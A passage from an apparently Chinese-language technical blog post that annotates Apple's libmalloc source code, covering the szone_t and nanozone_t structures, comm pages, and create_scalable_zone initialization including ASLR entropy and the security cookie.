class="keyword">large_entry_t</span>		*large_entries; <span class="comment">// hashed by location; null entries don't count</span></span><br><span class="line">	<span class="keyword">size_t</span>			num_bytes_in_large_objects;</span><br><span class="line"></span><br><span class="line"><span class="preprocessor">#<span class="keyword">if</span> LARGE_CACHE</span></span><br><span class="line">	<span class="keyword">int</span>				large_entry_cache_oldest;</span><br><span class="line">	<span class="keyword">int</span>				large_entry_cache_newest;</span><br><span class="line">	<span class="keyword">large_entry_t</span>		large_entry_cache[LARGE_ENTRY_CACHE_SIZE]; <span class="comment">// "death row" for large malloc/free</span></span><br><span class="line">	<span class="keyword">boolean_t</span>			large_legacy_reset_mprotect;</span><br><span class="line">	<span class="keyword">size_t</span>			large_entry_cache_reserve_bytes;</span><br><span class="line">	<span class="keyword">size_t</span>			large_entry_cache_reserve_limit;</span><br><span class="line">	<span class="keyword">size_t</span>			large_entry_cache_bytes; <span class="comment">// total size of death row, bytes</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* flag and limits pertaining to altered malloc behavior for systems with</span><br><span class="line">	 large amounts of physical memory */</span></span><br><span class="line">	<span class="keyword">unsigned</span>  is_largemem;</span><br><span class="line">	<span class="keyword">unsigned</span>  large_threshold;</span><br><span class="line">	<span class="keyword">unsigned</span>  vm_copy_threshold;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* security cookie */</span></span><br><span class="line">	<span class="keyword">uintptr_t</span> cookie;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Initial region list */</span></span><br><span class="line">	<span class="keyword">region_t</span>			initial_tiny_regions[INITIAL_NUM_REGIONS];</span><br><span class="line">	<span class="keyword">region_t</span>			initial_small_regions[INITIAL_NUM_REGIONS];</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* The purgeable zone constructed by create_purgeable_zone() would like to hand off tiny and small</span><br><span class="line">	 * allocations to the default scalable zone. Record the latter as the "helper" zone here. */</span></span><br><span class="line">	<span class="keyword">struct</span> szone_s		*helper_zone;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">boolean_t</span>			flotsam_enabled;</span><br><span class="line">&#125; <span class="keyword">szone_t</span>;</span><br></pre></td></tr></table></figure>
<p><code>nano_zone_t</code>与<code>malloc_zone_t</code>的关系相同，因为<code>nano_zone_t</code>的结构相对简单，可以先从<code>nano_zone_t</code>入手，理解其使用方法。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> nanozone_s &#123;				<span class="comment">// vm_allocate()'d, so page-aligned to begin with.</span></span><br><span class="line">	<span class="keyword">malloc_zone_t</span>		basic_zone;		<span class="comment">// first page will be given read-only protection</span></span><br><span class="line">	<span class="keyword">uint8_t</span>			pad[PAGE_MAX_SIZE - <span class="keyword">sizeof</span>(<span class="keyword">malloc_zone_t</span>)];</span><br><span class="line"></span><br><span class="line">	<span class="comment">// remainder of structure is R/W (contains no function pointers)</span></span><br><span class="line">	<span class="comment">// page-aligned</span></span><br><span class="line">	<span class="keyword">struct</span> nano_meta_s		meta_data[NANO_MAG_SIZE][NANO_SLOT_SIZE]; <span class="comment">// max: NANO_MAG_SIZE cores x NANO_SLOT_SIZE slots for nano blocks &#123;16 .. 256&#125;</span></span><br><span class="line">	_malloc_lock_s			band_resupply_lock[NANO_MAG_SIZE];</span><br><span class="line">    <span class="keyword">uintptr_t</span>           band_max_mapped_baseaddr[NANO_MAG_SIZE];</span><br><span class="line">	<span class="keyword">size_t</span>			core_mapped_size[NANO_MAG_SIZE];</span><br><span class="line"></span><br><span class="line">	<span class="keyword">unsigned</span>			debug_flags;</span><br><span class="line">	<span class="keyword">unsigned</span>			our_signature;</span><br><span class="line">	<span class="keyword">unsigned</span>			phys_ncpus;</span><br><span class="line">	<span class="keyword">unsigned</span>			logical_ncpus;</span><br><span class="line">	<span class="keyword">unsigned</span>			hyper_shift;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* security cookie */</span></span><br><span class="line">	<span class="keyword">uintptr_t</span>			cookie;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span><br><span class="line">	 * The nano zone constructed by create_nano_zone() would like to hand off tiny, small, and large</span><br><span class="line">	 * allocations to the default scalable zone. Record the latter as the "helper" zone here.</span><br><span class="line">	 */</span></span><br><span class="line">	<span class="keyword">malloc_zone_t</span>		*helper_zone;</span><br><span class="line">&#125; <span class="keyword">nanozone_t</span>;</span><br></pre></td></tr></table></figure>
<p>在实际的使用中，代码是这样写的。详细的<code>nano_zone</code>创建，会在下文出现。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor">#<span class="keyword">define</span> SZONE_PAGED_SIZE	((sizeof(nanozone_t) + vm_page_size - <span class="number">1</span>) &amp; ~ (vm_page_size - <span class="number">1</span>))</span></span><br><span class="line"><span class="keyword">malloc_zone_t</span> *</span><br><span class="line">foo()&#123;</span><br><span class="line">	<span class="keyword">nanozone_t</span>	*nanozone;</span><br><span class="line">	nanozone = allocate_pages(<span class="literal">NULL</span>, SZONE_PAGED_SIZE, <span class="number">0</span>, <span class="number">0</span>, VM_MEMORY_MALLOC);</span><br><span class="line">	<span class="comment">/*对nano_zone进行处理，设置内部数据*/</span></span><br><span class="line">	<span class="keyword">return</span> (<span class="keyword">malloc_zone_t</span> *)nanozone; <span class="comment">//强制转换指针类型，外部结构只能通过malloc_zone_t的殊绝结构来调用malloc_zone_t中的一些函数，来接进行数据处理。</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="create_scalable_zone">create_scalable_zone</h3><p>该函数实现了helper_zone的创建以及相关数据的初始化。</p>
<h4 id="comm_pages">comm pages</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// * The shared kernel/user "comm page(s)":</span></span><br><span class="line"> <span class="comment">//*</span></span><br><span class="line"> <span class="comment">//* The last several pages of every address space are reserved for the kernel/user</span></span><br><span class="line"> <span class="comment">//* "comm area". During system initialization, the kernel populates the comm pages with</span></span><br><span class="line"> <span class="comment">//* code customized for the particular processor and platform</span></span><br></pre></td></tr></table></figure>
<p><code>comm pages</code>是系统初始化时创建的一块共享的内存区域，保存了一些系统的数据。在<code>libmalloc</code>中有不少地方都用到了<code>comm pages</code>来获取系统的属性。</p>
<h4 id="源码注释">源码注释</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">malloc_zone_t</span> *</span><br><span class="line">create_scalable_zone(<span class="keyword">size_t</span> initial_size, <span class="keyword">unsigned</span> debug_flags)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">szone_t</span>	*szone;</span><br><span class="line">	<span class="keyword">uint64_t</span>	hw_memsize = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//判断comm page的版本是否符合要求</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">if</span> defined(__i386__) || defined(__x86_64__)</span></span><br><span class="line">	<span class="keyword">if</span> (_COMM_PAGE_VERSION_REQD &gt; (*((<span class="keyword">uint16_t</span> *)_COMM_PAGE_VERSION))) &#123;</span><br><span class="line">		malloc_printf(<span class="string">"*** ERROR - comm page version mismatch.\n"</span>);</span><br><span class="line">		<span class="built_in">exit</span>(-<span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line"><span class="preprocessor">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* get memory for the zone. */</span></span><br><span class="line">	<span class="comment">//从内核中获取了内存空间，对应szone的大小，因为一些调试参数的不同，内存的布局可能会不同。</span></span><br><span class="line">	<span class="comment">// #define SZONE_PAGED_SIZE		round_page_quanta((sizeof(szone_t))) </span></span><br><span class="line">	<span class="comment">// SZONE_PAGED_SIZE 是szone_t的大小根据page大小对齐之后的大小</span></span><br><span class="line">	szone = allocate_pages(<span class="literal">NULL</span>, SZONE_PAGED_SIZE, <span class="number">0</span>, <span class="number">0</span>, VM_MEMORY_MALLOC);</span><br><span class="line">	<span class="keyword">if</span> (!szone)</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* set up the szone structure */</span></span><br><span class="line">	<span class="comment">// 调试信息的设置以及调试日志的设置</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">if</span> <span class="number">0</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">warning</span> CHECK_REGIONS enabled</span></span><br><span class="line">	debug_flags |= CHECK_REGIONS;</span><br><span class="line"><span class="preprocessor">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">if</span> <span class="number">0</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">warning</span> LOG enabled</span></span><br><span class="line">	szone-&gt;log_address = ~<span class="number">0</span>;</span><br><span class="line"><span class="preprocessor">#<span class="keyword">endif</span></span></span><br><span class="line">	<span class="comment">//zone中与tiny相关的数据初始化</span></span><br><span class="line">	<span class="comment">/*</span><br><span class="line">		typedef struct region_hash_generation &#123;</span><br><span class="line">			size_t		num_regions_allocated;</span><br><span class="line">			size_t		num_regions_allocated_shift; // log2(num_regions_allocated)</span><br><span class="line">			region_t		*hashed_regions;  // hashed by location</span><br><span class="line">			struct		region_hash_generation *nextgen;</span><br><span class="line">		&#125; region_hash_generation_t;</span><br><span class="line">	*/</span></span><br><span class="line">	</span><br><span class="line">	<span class="comment">/*</span><br><span class="line">		...</span><br><span class="line">		_malloc_lock_s				tiny_regions_lock CACHE_ALIGN;</span><br><span class="line">		size_t						num_tiny_regions;</span><br><span class="line">		size_t						num_tiny_regions_dealloc;</span><br><span class="line">		region_hash_generation_t	*tiny_region_generation;</span><br><span class="line">		region_hash_generation_t	trg[2];</span><br><span class="line"></span><br><span class="line">		int					num_tiny_magazines;</span><br><span class="line">		unsigned			num_tiny_magazines_mask;</span><br><span class="line">		int					num_tiny_magazines_mask_shift;</span><br><span class="line">		magazine_t			*tiny_magazines; // array of per-processor magazines</span><br><span class="line"></span><br><span class="line">		uintptr_t			last_tiny_advise;</span><br><span class="line">		...</span><br><span class="line">	*/</span></span><br><span class="line">	szone-&gt;trg[<span class="number">0</span>].nextgen = &amp;(szone-&gt;trg[<span class="number">1</span>]);</span><br><span class="line">	szone-&gt;trg[<span class="number">1</span>].nextgen = &amp;(szone-&gt;trg[<span class="number">0</span>]);</span><br><span class="line">	szone-&gt;tiny_region_generation = &amp;(szone-&gt;trg[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">	szone-&gt;tiny_region_generation-&gt;hashed_regions = szone-&gt;initial_tiny_regions;</span><br><span class="line">	szone-&gt;tiny_region_generation-&gt;num_regions_allocated = INITIAL_NUM_REGIONS;</span><br><span class="line">	szone-&gt;tiny_region_generation-&gt;num_regions_allocated_shift = INITIAL_NUM_REGIONS_SHIFT;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">/*</span><br><span class="line">		初始化之后数相关数据结构如下</span><br><span class="line">----------------------------------</span><br><span class="line">|num_tiny_regions                |</span><br><span class="line">----------------------------------</span><br><span class="line">|num_tiny_regions_dealloc        |</span><br><span class="line">----------------------------------												 </span><br><span class="line">|tiny_region_generation = &amp;trg[0]| </span><br><span class="line">----------------------------------      --------------------------------------------------------- </span><br><span class="line">|trg[0]                          |------|num_regions_allocated = INITIAL_NUM_REGIONS            |&lt;-----</span><br><span class="line">----------------------------------      ---------------------------------------------------------     |</span><br><span class="line">|trg[1]                          |---   |num_regions_allocated_shift = INITIAL_NUM_REGIONS_SHIFT|     |</span><br><span class="line">---------------------------------|  |   ---------------------------------------------------------     |</span><br><span class="line">|num_tiny_magazines              |  |   |hashed_regionsr = initial_tiny_regions                 |=====|=====</span><br><span class="line">----------------------------------  |   ---------------------------------------------------------     |   ||</span><br><span class="line">|num_tiny_magazines_mask         |  |   |nextgen = &amp;trg[1]                                      |---  |   ||</span><br><span class="line">----------------------------------  |   ---------------------------------------------------------  |  |   ||</span><br><span class="line">|num_tiny_magazines_mask_shift   |  |   ---------------------------------------------------------  |  |   ||</span><br><span class="line">----------------------------------  ----|num_regions_allocated = 0                              |&lt;--  |   ||  </span><br><span class="line">|tiny_magazines                  |      ---------------------------------------------------------     |   ||  </span><br><span class="line">----------------------------------      |num_regions_allocated_shift = 0                        |     |   ||  </span><br><span class="line">|last_tiny_advise                |      ---------------------------------------------------------     |   ||</span><br><span class="line">----------------------------------      |hashed_regions = NULL                                  |     |   ||</span><br><span class="line">|initial_tiny_regions            |&lt;===  ---------------------------------------------------------     |   ||</span><br><span class="line">----------------------------------  ||  |nextgen = &amp;trg[0]                                      |------   ||</span><br><span class="line">                                    ||  ---------------------------------------------------------         ||</span><br><span class="line">                                    =======================================================================	</span><br><span class="line">												</span><br><span class="line">	*/</span></span><br><span class="line">	<span class="comment">//zone中与small相关的数据初始化</span></span><br><span class="line">	szone-&gt;srg[<span class="number">0</span>].nextgen = &amp;(szone-&gt;srg[<span class="number">1</span>]);</span><br><span class="line">	szone-&gt;srg[<span class="number">1</span>].nextgen = &amp;(szone-&gt;srg[<span class="number">0</span>]);</span><br><span class="line">	szone-&gt;small_region_generation = &amp;(szone-&gt;srg[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">	szone-&gt;small_region_generation-&gt;hashed_regions = szone-&gt;initial_small_regions;</span><br><span class="line">	szone-&gt;small_region_generation-&gt;num_regions_allocated = INITIAL_NUM_REGIONS;</span><br><span class="line">	szone-&gt;small_region_generation-&gt;num_regions_allocated_shift = INITIAL_NUM_REGIONS_SHIFT;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//初始化之后完全与tiny相同，只是变量不同。</span></span><br><span class="line">	</span><br><span class="line">	<span class="comment">/*</span><br><span class="line">	 * Initialize variables that size the free list for SMALL allocations based</span><br><span class="line">	 * upon the amount of memory in the system.  Switch to a larger number of</span><br><span class="line">	 * free list entries at 1GB.</span><br><span class="line">	 */</span></span><br><span class="line">	<span class="comment">// 初始化一些变量，根据系统中的内存的用量来计算SMALL分配列表的大小时将会用到这些变量。</span></span><br><span class="line">	</span><br><span class="line">	<span class="comment">// * The shared kernel/user "comm page(s)":</span></span><br><span class="line"> <span class="comment">//*</span></span><br><span class="line"> <span class="comment">//* The last several pages of every address space are reserved for the kernel/user</span></span><br><span class="line"> <span class="comment">//* "comm area". During system initialization, the kernel populates the comm pages with</span></span><br><span class="line"> <span class="comment">//* code customized for the particular processor and platform.</span></span><br><span class="line"> <span class="comment">//*1073741824</span></span><br><span class="line"> <span class="comment">//* Because Mach VM cannot map the last page of an address space, we don't use it</span></span><br><span class="line"> <span class="comment">//</span></span><br><span class="line">	</span><br><span class="line">	<span class="comment">//----------根据是否需要使用large，做出不同的初始化---------------start-------------</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">if</span> defined(__i386__) || defined(__x86_64__) || defined(__arm__) || defined(__arm64__)</span></span><br><span class="line">	<span class="keyword">if</span> ((hw_memsize = *(<span class="keyword">uint64_t</span> *)(<span class="keyword">uintptr_t</span>)_COMM_PAGE_MEMORY_SIZE) &gt;= (<span class="number">1U</span>LL &lt;&lt; <span class="number">30</span>))</span><br><span class="line"><span class="preprocessor">#<span class="keyword">else</span></span></span><br><span class="line">		<span class="keyword">size_t</span>	uint64_t_size = <span class="keyword">sizeof</span>(hw_memsize);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (<span class="number">0</span> == sysctlbyname(<span class="string">"hw.memsize"</span>, &amp;hw_memsize, &amp;uint64_t_size, <span class="number">0</span>, <span class="number">0</span>) &amp;&amp;</span><br><span class="line">		hw_memsize &gt;= (<span class="number">1U</span>LL &lt;&lt; <span class="number">30</span>))</span><br><span class="line"><span class="preprocessor">#<span class="keyword">endif</span></span></span><br><span class="line">	&#123;</span><br><span class="line">		szone-&gt;is_largemem = <span class="number">1</span>;</span><br><span class="line">		szone-&gt;num_small_slots = NUM_SMALL_SLOTS_LARGEMEM;</span><br><span class="line">		szone-&gt;large_threshold = LARGE_THRESHOLD_LARGEMEM;</span><br><span class="line">		szone-&gt;vm_copy_threshold = VM_COPY_THRESHOLD_LARGEMEM;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		szone-&gt;is_largemem = <span class="number">0</span>;</span><br><span class="line">		szone-&gt;num_small_slots = NUM_SMALL_SLOTS;</span><br><span class="line">		szone-&gt;large_threshold = LARGE_THRESHOLD;</span><br><span class="line">		szone-&gt;vm_copy_threshold = VM_COPY_THRESHOLD;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="preprocessor">#<span class="keyword">if</span> LARGE_CACHE</span></span><br><span class="line">	szone-&gt;large_entry_cache_reserve_limit =</span><br><span class="line">	hw_memsize &gt;&gt; <span class="number">10</span>; <span class="comment">// madvise(..., MADV_REUSABLE) death-row arrivals above this threshold [~0.1%]</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* &lt;rdar://problem/6610904&gt; Reset protection when returning a previous large allocation? */</span></span><br><span class="line">	<span class="keyword">int32_t</span> libSystemVersion  = NSVersionOfLinkTimeLibrary(<span class="string">"System"</span>);</span><br><span class="line">	<span class="keyword">if</span> ((-<span class="number">1</span> != libSystemVersion) &amp;&amp; ((libSystemVersion &gt;&gt; <span class="number">16</span>) &lt; <span class="number">112</span>) <span class="comment">/* CFSystemVersionSnowLeopard */</span>)</span><br><span class="line">		szone-&gt;large_legacy_reset_mprotect = TRUE;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		szone-&gt;large_legacy_reset_mprotect = FALSE;</span><br><span class="line"><span class="preprocessor">#<span class="keyword">endif</span></span></span><br><span class="line">	<span class="comment">//----------根据是否需要使用large，做出不同的初始化---------------end----------------</span></span><br><span class="line">	</span><br><span class="line">	<span class="comment">// Prepare ASLR</span></span><br><span class="line">	<span class="comment">// ---------处理ASLR相关的内容---------------------------------start---------------</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">if</span> __i386__ || __x86_64__ || __arm64__ || TARGET_OS_EMBEDDED</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">if</span> __i386__</span></span><br><span class="line">	<span class="keyword">uintptr_t</span> stackbase = <span class="number">0x8fe00000</span>;</span><br><span class="line">	<span class="keyword">int</span> entropic_bits = <span class="number">3</span>;</span><br><span class="line"><span class="preprocessor">#<span class="keyword">elif</span> __x86_64__</span></span><br><span class="line">	<span class="keyword">uintptr_t</span> stackbase = USRSTACK64;</span><br><span class="line">	<span class="keyword">int</span> entropic_bits = <span class="number">16</span>;</span><br><span class="line"><span class="preprocessor">#<span class="keyword">elif</span> __arm64__</span></span><br><span class="line">	<span class="keyword">uintptr_t</span> stackbase = USRSTACK64;</span><br><span class="line">	<span class="keyword">int</span> entropic_bits = <span class="number">7</span>;</span><br><span class="line"><span class="preprocessor">#<span class="keyword">else</span></span></span><br><span class="line">	<span class="keyword">uintptr_t</span> stackbase = USRSTACK;</span><br><span class="line">	<span class="keyword">int</span> entropic_bits = <span class="number">3</span>;</span><br><span class="line"><span class="preprocessor">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// assert(((1 &lt;&lt; entropic_bits) - 1) &lt;&lt; SMALL_BLOCKS_ALIGN &lt; (stackbase - MAXSSIZ - ENTROPIC_KABILLION));</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (<span class="number">0</span> != _dyld_get_image_slide((<span class="keyword">const</span> <span class="keyword">struct</span> mach_header*)_NSGetMachExecuteHeader())) &#123;</span><br><span class="line">		<span class="keyword">if</span> (<span class="number">0</span> == entropic_address) &#123;</span><br><span class="line">			<span class="keyword">uintptr_t</span> t = stackbase - MAXSSIZ - ((<span class="keyword">uintptr_t</span>) (malloc_entropy[<span class="number">1</span>] &amp; ((<span class="number">1</span> &lt;&lt; entropic_bits) - <span class="number">1</span>)) &lt;&lt; SMALL_BLOCKS_ALIGN);</span><br><span class="line">			(<span class="keyword">void</span>)__sync_bool_compare_and_swap(&amp;entropic_limit, <span class="number">0</span>, t); <span class="comment">// Just one initialization please</span></span><br><span class="line">			(<span class="keyword">void</span>)__sync_bool_compare_and_swap(&amp;entropic_address, <span class="number">0</span>, t - ENTROPIC_KABILLION); <span class="comment">// Just one initialization please</span></span><br><span class="line">		&#125;</span><br><span class="line">		debug_flags &amp;= ~DISABLE_ASLR;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="comment">// zero slide when ASLR has been disabled by boot-arg. Eliminate cloaking.</span></span><br><span class="line">		malloc_entropy[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">		malloc_entropy[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">		debug_flags |= DISABLE_ASLR;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"><span class="preprocessor">#<span class="keyword">else</span></span></span><br><span class="line">	malloc_entropy[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">	malloc_entropy[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">	debug_flags |= DISABLE_ASLR;</span><br><span class="line"><span class="preprocessor">#<span class="keyword">endif</span></span></span><br><span class="line">	<span class="comment">// ---------处理ASLR相关的内容---------------------------------end---------------</span></span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">	<span class="comment">// Initialize the security token.</span></span><br><span class="line">	<span class="comment">// ---------初始化外部调用函数---------------------------------start-------------</span></span><br><span class="line">	szone-&gt;cookie = (<span class="keyword">uintptr_t</span>)malloc_entropy[<span class="number">0</span>];</span><br><span 